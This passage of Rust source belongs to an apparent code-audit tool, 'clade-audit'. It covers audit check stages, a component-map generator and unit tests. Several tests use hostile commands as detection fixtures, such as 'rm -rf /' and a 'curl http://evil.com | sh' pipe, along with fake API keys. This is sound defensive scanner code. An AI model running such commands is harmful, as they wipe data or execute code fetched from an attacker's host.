    // Stage 5: Concurrency check
    note!("[Check 5/8] Concurrency - Swift 6 actor isolation");
    let conc = concurrency_check();
    note!(
        "   {} Files scanned: {} | Findings: {} | {}ms",
        if conc.passed { "[OK]" } else { "[FAIL]" },
        conc.scanned_files,
        conc.findings.len(),
        conc.duration_ms
    );
    for f in &conc.findings {
        note!("   [WARN]  {}:{} - {}", f.file, f.line, f.message);
    }

    // Stage 6: TODO/FIXME inventory
    note!("[Check 6/8] TODO/FIXME inventory - categorized severity");
    let todo = todo_check();
    note!(
        "   {} Files scanned: {} | Findings: {} | {}ms",
        if todo.passed { "[OK]" } else { "[FAIL]" },
        todo.scanned_files,
        todo.findings.len(),
        todo.duration_ms
    );
    for f in &todo.findings {
        note!("   [WARN]  {}:{} - {} ({})", f.file, f.line, f.message, f.severity);
    }

    // Stage 7: Unused code check
    note!("[Check 7/8] Unused code - dead private func/fn heuristic");
    let unused = unused_code_check();
    note!(
        "   {} Files scanned: {} | Findings: {} | {}ms",
        if unused.passed { "[OK]" } else { "[FAIL]" },
        unused.scanned_files,
        unused.findings.len(),
        unused.duration_ms
    );
    for f in &unused.findings {
        note!("   [WARN]  {}:{} - {}", f.file, f.line, f.message);
    }

    // Stage 8: Retain cycle check
    note!("[Check 8/8] Retain cycles - missing [weak self] in closures");
    let retain = retain_cycle_check();
    note!(
        "   {} Files scanned: {} | Findings: {} | {}ms",
        if retain.passed { "[OK]" } else { "[FAIL]" },
        retain.scanned_files,
        retain.findings.len(),
        retain.duration_ms
    );
    for f in &retain.findings {
        note!("   [WARN]  {}:{} - {}", f.file, f.line, f.message);
    }

    if json_mode {
        let report = serde_json::json!({
            "build_check": build,
            "security_check": security,
            "shell_safety_check": shell,
            "error_handling_check": err,
            "concurrency_check": conc,
            "todo_check": todo,
            "unused_code_check": unused,
            "retain_cycle_check": retain,
        });
        println!("\n{}", serde_json::to_string_pretty(&report).unwrap_or_default());
    }
}

#[derive(Serialize, Deserialize, Debug)]
struct SelfAwareness {
    generated_at: String,
    rings: Vec<ComponentInfo>,
    skills: Vec<ComponentInfo>,
    agents: Vec<ComponentInfo>,
    experience_count: usize,
    latest_experience: Option<String>,
}

#[derive(Serialize, Deserialize, Debug)]
struct ComponentInfo {
    id: String,
    name: String,
    path: String,
    language: String,
    description: Option<String>,
}

/// Generate `.trinity/self-awareness.json` - machine-readable graph of all components.
fn generate_self_awareness(dry_run: bool) {
    let mut rings: Vec<ComponentInfo> = vec![];
    let mut skills: Vec<ComponentInfo> = vec![];
    let mut agents: Vec<ComponentInfo> = vec![];

    // Discover Rust rings
    for entry in WalkDir::new(format!("{}/rings", &project_dir()))
        .max_depth(3)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_name() == "Cargo.toml")
    {
        let path = entry.path();
        let parent = path.parent().unwrap_or(path);
        let name = parent.file_name()
            .and_then(|s| s.to_str())
            .unwrap_or("unknown")
            .to_string();
        let ring_dir = parent.strip_prefix(project_dir()).unwrap_or(parent)
            .to_string_lossy()
            .to_string();

        let description = fs::read_to_string(path).ok().and_then(|content| {
            content.lines().find(|l| l.starts_with("description"))
                .map(|l| l.split("=")
                    .nth(1)
                    .unwrap_or("")
                    .trim()
                    .trim_matches('"')
                    .to_string())
        });

        let ring_id = ring_dir.split('/').nth(1).unwrap_or("RUST-XX").to_string();
        rings.push(ComponentInfo {
            id: ring_id,
            name,
            path: ring_dir,
            language: "Rust".to_string(),
            description,
        });
    }

    // Discover Swift modules (SR-*)
    for entry in WalkDir::new(format!("{}/rings", &project_dir()))
        .max_depth(2)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            let p = e.path();
            let name = p.file_name().and_then(|s| s.to_str()).unwrap_or("");
            name.starts_with("SR-") && p.is_dir()
        })
    {
        let path = entry.path();
        let name = path.file_name().and_then(|s| s.to_str()).unwrap_or("unknown").to_string();
        let ring_dir = path.strip_prefix(project_dir()).unwrap_or(path)
            .to_string_lossy()
            .to_string();
        rings.push(ComponentInfo {
            id: name.clone(),
            name: name.clone(),
            path: ring_dir,
            language: "Swift".to_string(),
            description: Some(format!("Swift module {}", name)),
        });
    }

    // Discover skills
    let skills_dir = format!("{}/.claude/skills", &project_dir());
    if let Ok(entries) = std::fs::read_dir(&skills_dir) {
        for entry in entries.filter_map(|e| e.ok()) {
            let path = entry.path();
            if path.is_dir() {
                let name = path.file_name()
                    .and_then(|s| s.to_str())
                    .unwrap_or("unknown")
                    .to_string();
                let skill_path = path.strip_prefix(project_dir()).unwrap_or(&path)
                    .to_string_lossy()
                    .to_string();
                skills.push(ComponentInfo {
                    id: name.clone(),
                    name: name.clone(),
                    path: skill_path,
                    language: "markdown".to_string(),
                    description: Some(format!("Claude skill /{}", name)),
                });
            }
        }
    }

    // Discover agents
    let agents_dir = format!("{}/.claude/agents", &project_dir());
    if let Ok(entries) = std::fs::read_dir(&agents_dir) {
        for entry in entries.filter_map(|e| e.ok()) {
            let path = entry.path();
            if let Some(ext) = path.extension() {
                if ext == "md" {
                    let stem = path.file_stem()
                        .and_then(|s| s.to_str())
                        .unwrap_or("unknown")
                        .to_string();
                    let agent_path = path.strip_prefix(project_dir()).unwrap_or(&path)
                        .to_string_lossy()
                        .to_string();
                    agents.push(ComponentInfo {
                        id: stem.clone(),
                        name: stem.clone(),
                        path: agent_path,
                        language: "markdown".to_string(),
                        description: Some(format!("Trinity agent {}", stem)),
                    });
                }
            }
        }
    }

    // Experience files
    let exp_dir = format!("{}/.trinity/experience", &project_dir());
    let mut experience_count = 0;
    let mut latest_experience: Option<String> = None;
    if let Ok(entries) = std::fs::read_dir(&exp_dir) {
        let mut files: Vec<std::path::PathBuf> = vec![];
        for entry in entries.filter_map(|e| e.ok()) {
            let path = entry.path();
            if path.extension().and_then(|s| s.to_str()) == Some("json") {
                files.push(path);
            }
        }
        experience_count = files.len();
        files.sort();
        latest_experience = files.last().and_then(|p| {
            p.file_name().and_then(|s| s.to_str()).map(|s| s.to_string())
        });
    }

    let awareness = SelfAwareness {
        generated_at: chrono::Utc::now().to_rfc3339(),
        rings,
        skills,
        agents,
        experience_count,
        latest_experience,
    };

    let json = serde_json::to_string_pretty(&awareness).unwrap_or_default();
    let out_path = format!("{}/.trinity/self-awareness.json", &project_dir());

    if dry_run {
        println!("[DRY-RUN] Would write {} rings, {} skills, {} agents to {}",
            awareness.rings.len(), awareness.skills.len(), awareness.agents.len(), out_path);
        println!("{}", json);
    } else {
        if let Err(e) = std::fs::create_dir_all(format!("{}/.trinity", &project_dir())) {
            eprintln!("[audit] Failed to create .trinity dir: {}", e);
        }
        match std::fs::write(&out_path, &json) {
            Ok(_) => println!("[OK] Self-awareness written: {} rings, {} skills, {} agents | {}",
                awareness.rings.len(), awareness.skills.len(), awareness.agents.len(), out_path),
            Err(e) => eprintln!("[FAIL] Failed to write self-awareness: {}", e),
        }
    }
}

fn print_help() {
    println!(
        r#"
clade-audit - Continuous code critic for Trinity

USAGE:
    cargo run --bin clade-audit -- [COMMAND] [--dry-run] [--json] [--canon]

COMMANDS:
    generate-awareness   Write .trinity/self-awareness.json

CHECKS (default run):
    1. Build gate     - swiftc -typecheck + cargo check --workspace
    2. Security scan  - forbidden patterns, hardcoded secrets
    3. Shell safety   - Process() allowlist compliance (SOUL.md Article IX)
    4. Error handling - bare try!, as!, unhandled try?
    5. Concurrency    - Swift 6 actor isolation anti-patterns
    6. TODO/FIXME     - categorized severity inventory
    7. Unused code    - dead function/module detection
    8. Retain cycles  - missing [weak self] in async closures

T27 CANON GUARD:
    --canon              Check L2 GENERATION for BR-OUTPUT/*.swift:
                         every canon file must have an active claim,
                         AGENT-V-WAIVER block, or existing seal.
    --canon --dry-run    Print per-file protection status without failing.

OUTPUT:
    --json   Emit structured report to stdout
    --dry-run  Do not write .trinity/audit/*.json
"#
    );
}

#[cfg(test)]
// Tests legitimately use expect()/unwrap() for fixtures and invariants; the
// workspace deny/warn policy targets production code paths, not test setup.
#[allow(clippy::expect_used)]
mod tests {
    use super::*;

    #[test]
    fn audit_finding_fingerprint_format() {
        let f = AuditFinding {
            file: "main.swift".to_string(),
            line: 42,
            severity: "critical".to_string(),
            category: "security".to_string(),
            message: "Forbidden: rm -rf /".to_string(),
            fingerprint: "main.swift:42:Forbidden: rm -rf /".to_string(),
        };
        assert!(f.fingerprint.contains(&f.file));
        assert!(f.fingerprint.contains(&f.line.to_string()));
        assert_eq!(f.severity, "critical");
    }

    #[test]
    fn relative_audit_path_strips_project_root() {
        use std::path::PathBuf;
        let root = project_dir();
        let p = PathBuf::from(format!("{}/rings/RUST-12/x.rs", root));
        assert_eq!(relative_audit_path(&p), "rings/RUST-12/x.rs");
    }

    #[test]
    fn scannable_content_skips_auditor_own_source() {
        use std::path::Path;
        let p = Path::new("/x/trios/rings/RUST-12/clade-audit/src/main.rs");
        assert_eq!(scannable_content(p, "rm -rf /"), "");
    }

    #[test]
    fn scannable_content_drops_test_module() {
        use std::path::Path;
        let p = Path::new("/x/trios/rings/RUST-99/foo/src/main.rs");
        let src = "fn real() {}\n#[cfg(test)]\nmod tests { let k = \"sk-deadbeef\"; }";
        let out = scannable_content(p, src);
        assert!(out.contains("fn real()"));
        assert!(!out.contains("sk-deadbeef")); // test fixture excluded
    }

    #[test]
    fn scannable_content_keeps_nontest_code() {
        use std::path::Path;
        let p = Path::new("/x/trios/rings/RUST-99/foo/src/lib.rs");
        let src = "fn a() {}\nfn b() {}\n";
        assert_eq!(scannable_content(p, src), src);
    }

    #[test]
    fn relative_audit_path_redacts_external_path() {
        use std::path::Path;
        // A path outside the project root must not leak its absolute host path.
        let out = relative_audit_path(Path::new("/definitely/outside/secret.rs"));
        assert_eq!(out, "secret.rs");
        assert!(!out.contains('/'));
    }

    #[test]
    fn security_patterns_detect_rm_rf() {
        let re = Regex::new(r"rm\s+-rf\s+/").expect("valid regex");
        assert!(re.is_match("rm -rf /"));
        assert!(re.is_match("  rm  -rf  /etc"));
        assert!(!re.is_match("rm -r ./local"));
    }

    #[test]
    fn security_patterns_detect_curl_pipe_sh() {
        let re = Regex::new(r"curl\s+.*\|\s*sh").expect("valid regex");
        assert!(re.is_match("curl http://evil.com | sh"));
        assert!(!re.is_match("curl http://example.com -o file"));
    }

    #[test]
    fn security_patterns_detect_hardcoded_key() {
        let re = Regex::new(r#"api[_-]?key\s*=\s*[^"']*["']\w{20,}"#).expect("valid regex");
        assert!(re.is_match(r#"api_key = "sk_test_12345678901234567890""#));
        assert!(!re.is_match(r#"api_key = env("KEY")"#));
    }

    #[test]
    fn build_check_result_passed_logic() {
        let result = BuildCheckResult {
            passed: true,
            swift_ok: true,
            rust_ok: true,
            swift_errors: vec![],
            rust_errors: vec![],
            duration_ms: 100,
        };
        assert!(result.passed);
        assert!(result.swift_ok && result.rust_ok);

        let failed = BuildCheckResult {
            passed: false,
            swift_ok: false,
            rust_ok: true,
            swift_errors: vec!["error: type mismatch".to_string()],
            rust_errors: vec![],
            duration_ms: 200,
        };
        assert!(!failed.passed);
        assert_eq!(failed.swift_errors.len(), 1);
    }

    #[test]
    fn security_check_result_empty_is_pass() {
        let result = SecurityCheckResult {
            passed: true,
            findings: vec![],
            scanned_files: 10,
            duration_ms: 50,
        };
        assert!(result.passed);
        assert!(result.findings.is_empty());
    }

    #[test]
    fn todo_regex_matches_variants() {
        let re = Regex::new(r"(?i)(TODO|FIXME|HACK|XXX|WARN|BUG)\s*[:\-]?\s*(.*)").expect("valid regex");
        assert!(re.is_match("// TODO: fix this"));
        assert!(re.is_match("// FIXME - broken"));
        assert!(re.is_match("// HACK workaround"));
        assert!(re.is_match("// BUG: crashes on nil"));
        assert!(!re.is_match("// This is fine"));
    }

    #[test]
    fn read_file_bounded_returns_none_for_missing() {
        let dir = tempfile::tempdir().expect("tempdir");
        let missing = dir.path().join("nonexistent_audit_test_file");
        let result = read_file_bounded(&missing);
        assert!(result.is_none());
    }

    #[test]
    fn read_file_bounded_reads_small_file() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("clade_audit_bounded_test.txt");
        fs::write(&path, "hello bounded").ok();
        let result = read_file_bounded(&path);
        assert_eq!(result, Some("hello bounded".to_string()));
    }

    #[test]
    fn max_file_size_is_10mb() {
        assert_eq!(MAX_FILE_SIZE, 10 * 1024 * 1024);
    }
}
